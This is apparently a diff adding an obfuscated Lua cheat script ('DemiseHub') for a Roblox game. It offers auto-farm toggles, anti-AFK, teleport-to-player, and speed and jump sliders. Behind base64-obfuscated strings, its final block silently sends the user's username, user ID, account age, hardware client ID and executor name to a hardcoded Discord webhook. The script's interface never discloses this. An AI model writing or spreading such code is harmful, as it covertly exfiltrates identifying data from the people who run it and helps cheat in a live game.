+                            [1] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('GextHjmAGqbhNghQFZotiGxrBDVYVSrnDJsNrTxcOCXBouYAMiMoyzVQ2xlYW4='),
+                            [2] = v.Attachment.Clean,
+                        }
+    
+                        game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('rfEBDzIJcFITeLcGHtJJVTNLTXVtpyHcMzbyrtxkqdejarQOpmUlgrWUmVwbGljYXRlZFN0b3JhZ2U=')).Remote:FireServer(unpack(args))
+                        task.wait(0.2)
+                        local anims = game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()
+                        local count = 5
+                        repeat
+                            count -= 1
+                            anims = game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()
+                            task.wait(1)
+                        until #anims <= 1 or count <= 0
+                        busy = false
+                    end
+                end
+                task.wait()
+            end
+        end)
+    end
+    
+    function AutoStains()
+        task.spawn(function()
+            while getgenv().AutoStainsValue do
+                if not getgenv().AutoStainsValue and stam <= 15 then
+                    break
+                end
+    
+                for i, v in pairs(workspace.Stains:GetChildren()) do
+                    if stam <= 15 then
+                        break
+                    end
+                    if not busy and v:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('zugmCeIXaHqJgIBWGhZABwGGwNqdYcQSyyFFjhiiYmpeBSNdYJCJvcbQ2xlYW4=')) then
+                        busy = true
+                        local args = {
+                            [1] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OYmfXnDddWVYAUvgtukNHVvmrIBYisioSxrWzPPYWFrRGqpqZDcucjNQ2xlYW4='),
+                            [2] = v.Clean,
+                        }
+    
+                        game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('tgYdtQMnLQyUZszcfXFOzNQARWynXTTlMczTZIIvkPYdzxIxjjgHfDtUmVwbGljYXRlZFN0b3JhZ2U=')).Remote:FireServer(unpack(args))
+                        task.wait(0.5)
+                        busy = false
+                    end
+                end
+                task.wait()
+            end
+        end)
+    end
+    
+    function AutoCashier()
+        task.spawn(function()
+            while getgenv().AutoCashierValue do
+                if not getgenv().AutoCashierValue and stam <= 15 then
+                    break
+                end
+    
+                for _, cashier in pairs(workspace.Checkouts:GetChildren()) do
+                    if #cashier.Items:GetChildren() > 0 and not busy then
+                        busy = true
+                        for i, v in pairs(cashier.Items:GetChildren()) do
+                            local args = {
+                                [1] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YBkEyHfkLfAgzfLmCoNdHKILzKfwwdGrhPJpsbjOuqbEEMKbIGTvQYVU2Nhbkl0ZW0='),
+                                [2] = v,
+                                [3] = cashier,
+                            }
+    
+                            game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SqnMFTKPaFkHrlSirwPdoOIVILYwAQHrxPwjBsAtgRHzmbKYvslNHITUmVwbGljYXRlZFN0b3JhZ2U=')).Remote:FireServer(unpack(args))
+                            task.wait(.5)
+                            busy = false
+                        end
+                        busy = false
+                    end
+                end
+                task.wait()
+            end
+        end)
+    end
+     
+    local FarmTab = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SyYcTHMLrpGBsclqoEBvbKtstJfyDzJldNqPYcukqUqlGcPSLNFpJaLQXV0b0Zhcm0='))
+    local TeleportTab = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('xGqyiyEZItBRcCefEpGPGuixGbgTJjALunOFErdbMxscXDsyCldFPAwVGVsZXBvcnQ='))
+    local MiscTab = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jjlUeqaGczPxjpQaNttrbftFXWqicrktqqozpsPAKBDIGzTiRcSKYktTWlzYw=='))
+
+    local AutoFarm = FarmTab:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('gHymbheECGiEoAzJShaTBYEVDwHLOTXYdmAnlahKoaryCfUNEIVmmvtQXV0byBTdHVmZg=='))
+    local Teleport = TeleportTab:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('imkmmDGlZTckYSCfgyqKKNkYkifnWiztsQwNHFVDjchMmyqjpXOAxAKVGVsZXBvcnQ='))
+    local Misc = MiscTab:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('flDWzSCPheGiuthrSQLxxtxvcEhWtBJNtSulhFTHvbEXDOIobOodLiiTWlzYw=='))
+ 
+
+    AutoFarm:CreateToggle{ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('BSdAypYcJwRKCNnguChimztyzUDtYeZGvziVRSvPJTNuSiLsobPWMdaQ2xlYW4gV2luZG93cw=='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('NiWLBVdYYqLhzBPOMHoQCJNwsCvGTfWhGCwLJuZXgzOaricgsvemtTid2lu'); 
+    Default = false;
+    Callback = function(v) 
+        getgenv().AutoWindowsValue = v
+        AutoWindows()
+    end;
+}
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('sHiiZYdBtEPnTUZViapZuGYRyDLZuIlHKXxZIGBtCOZJJWlkTZmxOWeQ2xlYW4gRmxvb3I='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XzjLjOhBjDZKFrfxxwucDaZUNgJBEWjQgCJtYGRCrhutGHqUMdvuUGDZmxv'); 
+    Default = false;
+    Callback = function(v) 
+        getgenv().AutoStainsValue = v
+        AutoStains()
+    end;
+})
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('NxFilspijwzKCKcMmFsWoGSqGTqEmAnjpYEMIeCUxsuIlXJgzQqdMnaQXV0byBDbGVhbiBTb2xhciBQYW5lbHM='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KTnOHpkIkoJiYvpDpFCknbDRxZIpdrBMaoneBUXKFTQlUCrWQYeIBfLc29s'); 
+    Default = false;
+    Callback = function(v) 
+        getgenv().AutoSolarValue = v
+        AutoSolar()
+    end;
+})
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('kldjHqHstZAwsQbSqNVQxEmoWowbxeFZBBEJJeCBjUZzMKcejFIRWViQXV0byBTY2FuIENoZWNrb3V0IEl0ZW1z'); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('yXqSzydDXoCxwllkuSKMknqWIoYinxjGOdBodoiMLLImpBDNAXkoCIqY2hl'); 
+    Default = false;
+    Callback = function(v) 
+        getgenv().AutoCashierValue = v
+        AutoCashier()
+    end;
+})
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('WekWuLMblMKFvfyGTwMpXwDvlySvbWUoNGZGGZjYTvhXnzRzntguqUjQXV0byBSZWZ1ZWwgQ2Fycw=='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vuodTvYashGJeIgmkGxnwQRoihJQJZrxcamazraqemGfpWuRdewCcojY2Fy'); 
+    Default = false;
+    Callback = function(v) 
+        getgenv().AutoPumpValue = v
+        AutoPump()
+    end;
+})
+
+AutoFarm:CreateToggle({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OUONcyTkvtFHBIneXroFEvsODsfVPuSasjJfRgSWVkOIKkXqZTTNIIJQW50aS1BRks='); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YOugJHgBxVnyxoCQjpjTZPMDqWnJOUkqopXUwTzEPUOyZUmRNPWotjkQUZL'); 
+    Default = false;
+    Callback = function() 
+        local Players = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ablrvhPcAMEPbNBfwFzbxyRZIWbEOYokhhMNEwhTydJkDaJIrwLfsuZUGxheWVycw=='))
+            local GC = getconnections or get_signal_cons
+            if GC then
+                for i, v in pairs(GC(Players.LocalPlayer.Idled)) do
+                    if v[IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KoPfaSwBxEUQeGwyIomOFmkLkVEFITXykNfVNBMXonUAmipYVNjPZLzRGlzYWJsZQ==')] then
+                        v[IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('hylWJeNDQxLYwgPuNiIgvHsAFjwYRwPNMxqqtibWzINFotlBNLDbpGKRGlzYWJsZQ==')](v)
+                    elseif v[IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('yFxDeWhDLhKbFFbwFTkMdLsqzSXbZXQTLvpjdrPiraayajuFTRJWDvvRGlzY29ubmVjdA==')] then
+                        v[IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OWLGVeMYFIsdfecpHecCDSgyTSRdxVFSXmGxCCOFIpbqrorbRjOxmosRGlzY29ubmVjdA==')](v)
+                    else
+                        print(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XyJZJnCETVSFziWTTaNwxAtfohVlLnMXQjRqKsibFEmlYuTxLiSFMaH'))
+                    end
+                end
+            elseif not GC then
+                UI:Notify({
+                    Title = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('GnMPSseqvzlXENwtWAoqMpnTgqrYRQlvDhpMRwpGMCnEKPAaIEYoTGCRGVtaXNlSHViIHwgRXJyb3I=');
+                    Content = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('MjJZQDQnLvrYPKLMxczFOLLHsBxuTCAporucaCEYGwAgpNjngiydmPnWW91ciBleGVjdXRvciBkb2VzIG5vdCBzdXBwb3J0IGdldGNvbm5lY3Rpb25zIA==') .. game.Players.LocalPlayer.Name,
+                }
+            )
+        end
+    end
+})
+
+local plrs = {}
+    local selectedPlr
+     
+for _, v in next, game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('auGSndPcQFiKCaBKtZBqiKmDjQMOQatFcxXyAKZNDnCqsbHQHxdfHqtUGxheWVycw==')):GetPlayers() do
+    if v.Name ~= game.Players.LocalPlayer.Name then
+        table.insert(plrs, v.Name)
+    end
+end
+
+Teleport:CreateDropdown({
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ssYrTYPQgCCUsKvjepTOdqJfpTvDrKAckUqQTkTdpQlUhTWuxxfzmJlU2VsZWN0IFBsYXllcg==');
+    Callback = function(x) 
+        selectedPlr = x
+    end;
+    Options = plrs;
+    ItemSelecting = true; 
+    DefaultItemSelected = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jOztPPjeyRcGTbKNquOhZLnBkYpMyvFeTaxBTaNWZUbcnqsztGigxBlbmls'); 
+    
+})
+
+Teleport:CreateButton{
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('CMweEqCCzERVojJjodDbyhZKwmVafLRXYsuiHoQvlbokQeexQwtTRpbVFAgVG8gUGxheWVy'); 
+    Callback = function() 
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+        game.Players[selectedPlr].Character.HumanoidRootPart.CFrame
+    end
+}
+
+Misc:CreateButton({
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('VLWPJWgeSrFDIvOjnZDlixIqvuHRKdsdPuqcbyxwlFzWxXRZlabjjIYSGVhZGxlc3M='); 
+    Callback = function() 
+        game.Players.LocalPlayer.Character.Head.Transparency = 1
+    end
+})
+
+Misc:CreateButton({
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HHtFNXaApIUmRJoMRLfBEUlwwYEgwxrVvznFmMgmvPiYasiYLExQrqsUmVtb3ZlIFRleHR1cmVz'); 
+    Callback = function() 
+        for _, v in next, workspace:GetDescendants() do
+            if v.ClassName == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('fzdvDOazZRooPWCnGJjdAKISkDpOKTBOGjxFOQJQPgkRLANDkNYBEWmRGVjYWw=') then
+                v:Destroy()
+            end
+        end
+    end
+})
+
+Misc:CreateSlider({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('zAjWgYyHqmQyGuQcrEDItTebGPfWquuQdrOLSAcvVZCjkUngejxGEYUV2Fsa1NwZWVk'); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('urHCzxyYCXEnJQhgupzTPAnQPNulafureToxJwWVLtRukbOoPbjZBjzd3M='); 
+    Min = 16; 
+    Max = 250; 
+    AllowOutOfRange = true;
+    Digits = 2;
+    Default = 16; 
+    Callback = function(v)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
+    end;
+})
+
+Misc:CreateSlider({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('AGNzsYOxAZEHeODavXsPxOdLFTsjwDugaLDDbvnFjsdHwmVxldnzbLeSnVtcFBvd2Vy'); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('EFXFIxuMhgnMtSOTYYVNxroEEupYRCXrScjYTKEpLBRZVPPtkSyzvppanA='); 
+    Min = 50; 
+    Max = 250; 
+    AllowOutOfRange = true;
+    Digits = 2;
+    Default = 50; 
+    Callback = function(v)
+        game.Players.LocalPlayer.Character.Humanoid.JumpHeight = v
+    end;
+})
+
+Misc:CreateSlider({ 
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('yFBITgfWGfBcjHXykjBJLOSzVGMfEgBYNdwBXKqYSRFfOqlKjVbArDJRk9W'); 
+    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('uQlOlSLqHYqsNTFAMiyBabDdRbDDglaXLtNxirxDVLmAuhXGkpQcQMiRk9W'); 
+    Min = 70; 
+    Max = 120; 
+    AllowOutOfRange = true;
+    Digits = 2;
+    Default = 70; 
+    Callback = function(v)
+        game.Workspace.CurrentCamera.FieldOfView = v
+    end;
+})
+
+AutoFarm:CreateButton({
+    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('QOQgqBNOPRBRFOzNJypCVMbVcogAVRwhturYymTWwCdHikFKcDcXimZRml4IENoYXJhY3Rlcg=='); 
+    Callback = function() 
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,5,0)
+    end
+})
+end
+
+local webh = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('uMmXMnTSfiykzomsPACSkbMeLdTDbjJkkYzZCOwlPfvebOwcdXZnUJHaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAzMzQ4MzE2Mzk5MDc2OTcyNS9RbVROQWdKZTE0MDdfVl9HaTRWbmc5TW1TMzNWWXRUSXJONDVJUDRLYWN5ejd4bllzaDByU2E1NEdVWEc3UkZ0UnY4Tg==')
+
+
+pcall(function()
+   local data = {
+
+  [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('UerDFbYArjeiqaFqxAlBYOFdOedlaxzKuTInNPKjVOSDYvTRUbxteQRZW1iZWRz')] = {
+    {
+       [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('DHHmQrtaLJZNACYTrsTHKHySEuiDDbazGTMrZHDDwJWrncHpXhzyYSodGl0bGU=')] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('LkuSoolOVPVMTjOGExvrjMBfHoIvVCwDzBzpVZVywEcdbHDkKVAFIfLYGBTb21lb25lIEV4ZWN1dGVkIEEgRGVtaXNlSHViIFNjcmlwdGBg'),
+       [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YuzYcwrCeLNzdurCEiaFyoHwcRzyoMXJaUUalTuHPynFEACOtOKgAkbZGVzY3JpcHRpb24=')] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('pbNvUqsYihJePYAWcJGhBNUNOslsDqgVqsuHCmxCIxuZloKlknxAsVfKipEZW1pc2VIdWIgSGFzIEJlZW4gRXhjdXRlZCoq'),
+       [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YsLyBJSDcItCpUOXvFWmSzGlhkuXTSMSTsQuFfveQpzriAuJsBMWKjddHlwZQ==')] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('LvtSsLcbuwRhQVyDMpEgopxIFSjBsFAdUtLAXReonIoYyzEDOsSBTjLcmljaA=='),
+       [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SLZNYxMoTOTCuGrVBtsqBlcSmCpZqfbXJbHITtvuSyNCTNbTWeGBqQIY29sb3I=')] = tonumber(16753920),
+       [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('lOMFbkYScvScNVmiqBbyTaGEqZsjhRQYydMHSlvgyccKVYUqpjuaSnUZmllbGRz')] = {
+          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('xIEwHmWAEKUKddzcVMPwUUmHRePdRSrIBFPpQetKhaXkjgUtUbAvSAuKipVc2VybmFtZSoq'), value = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OYkjHdZQwmZJgaAUcQKLzqQPunlcpkssminDaeOweUuzVcpCLtETPNZUGxheWVycw==')).LocalPlayer.Name},
+          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jnEiXOiPIwVihTMjDMoLiPQWKFZTJJWIYThSVoCkvXAsUXWsTsTuNRuKipEaXNwbGF5IE5hbWUqKg=='), value = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ymIgOYiXOrrUWXKcNcflksLoBMybYUTVJKFjsAcELkbkaDAMhaNpFcHUGxheWVycw==')).LocalPlayer.DisplayName},
+          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('cWhzGujpVRPNNFAequtKeSAoCDlAMIvGtJexJmVAYLxiwtVrqQyXsqGKipQbGF5ZXIgSUQqKg=='), value = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('DYUKPFpZSfurFOISjQjtdkGCgLkyheRtTuNhvXgAjKKuopbjUzrwRHEUGxheWVycw==')).LocalPlayer.UserId},
+          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('VebxTFAVygqbWvRTOfSFoYAJcJhXaUnkNSFBETJOoQUCNiReNqpCfEJKipQbGF5ZXIgQWNjb3VudCBBZ2UqKg=='), value = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('JqmvsybGoHvyNAphaDgCSDHroAdnZVXrMOFZwuImTwiPPYeSkFrjbwLUGxheWVycw==')).LocalPlayer.AccountAge},
+          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('mjKpSOBvTkWRzukRAfMWTVdzAAwwuCFWLRLtlolmEXYTbFdBBhbeEunKipIYXJkd2FyZSBJRCoq'), value = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ScfROsZVngwUIDeQOgwHOfNwvsnfJdnNqOIKCQwBVSsQCnQWFtDPvtxUmJ4QW5hbHl0aWNzU2VydmljZQ==')):GetClientId()},
+          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SIwdkknTFgfpEdIlEyhQJDIsshpELbQGRjnnYsBUlhpAzWTTTyLuOxxKipQaW5nKio='), value = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SYDuYUUyVYJFUNgoKzbGwdwbSiTWcSoHkxiupXanFkaNYjQvhpnBifDU3RhdHM=')).Network.ServerStatsItem[IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('dBMIjVaQQDdNOfdAaKFByYyygCaZOPBsfwBIiZCXLGdJeYIDShgxwMoRGF0YSBQaW5n')]:GetValueString()},
+          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('pqdwPuuGeouJwtqWAasxwWVxHYjhvFZBiaDVfHYgjCocFoNBKBZrMHyKipFeGVjdXRvcioq'), value = identifyexecutor()},
+        }
+    }
+  }
+}
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XXKUvGeAAusoQuhYWSwvNfiGtMqrdwSznfNDNwMWTrrYOIaSuQJRVTbUE9TVA=='),
+               Headers = {
+                   [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('uwXoyxZazWQWWzOfgIpJlAlWucdqFUGkGCgLmixkojqUEaOerVlOxTkQ29udGVudC1UeXBl')] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jnbvEwZkYdDJSkewcpdZkOUaMCGStXyuoZbROdyQGUfSUSIbRctqjobYXBwbGljYXRpb24vanNvbg==')
+               },
+               Body = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('PyCOzBOXPEZVSiLteQlxOCGdamqGvCHTHOKjOpKaOXFMvqLdMswSLnESHR0cFNlcnZpY2U=')):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('aMVvRMFwsdNgHeUWtGWOuRTFfOiJbhlmCQqcHORnjYTDXEJbhqvrNqfUE9TVA=='),
+               Headers = {
+                   [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KPVPXUJORdchrgqfHLvJpDqBTylgzdrJcdtrkgaWeyNxYeejAwcjKdmQ29udGVudC1UeXBl')] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HxVBgbUbTzmpYNQBHKdehFbFrogJjMHwEXehnUukBGbImFTrJNLzSPbYXBwbGljYXRpb24vanNvbg==')
+               },
+               Body = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('AlImHgltylLTIWyGcDDakSWdtiTSurMpkYEFMynHnLQTnfJjYQBSECMSHR0cFNlcnZpY2U=')):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('qQradABpzGNgYLJMvoNjOCPEZeVOVwinDYozFBQCMNagnXCbCRWAXgDUE9TVA=='),
+               Headers = {
+                   [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HlFlWixFfTKcBqOPaSBfiGLrXBIDbNgKmUOOAyBXPpglIPbjJTYzLdzQ29udGVudC1UeXBl')] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('UJgBQVIdsMboEHWQNsuwFYrkqwliIFhWITBvaVMzyuhLnwznmibYRylYXBwbGljYXRpb24vanNvbg==')
+               },
+               Body = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KYGsSlSICeMiMEBoIbGXoLjZLCzRNeYBVNihxUOfLlSMdLnMCTtpbqqSHR0cFNlcnZpY2U=')):JSONEncode(data)
+           }
+       );
+   end
+end)    
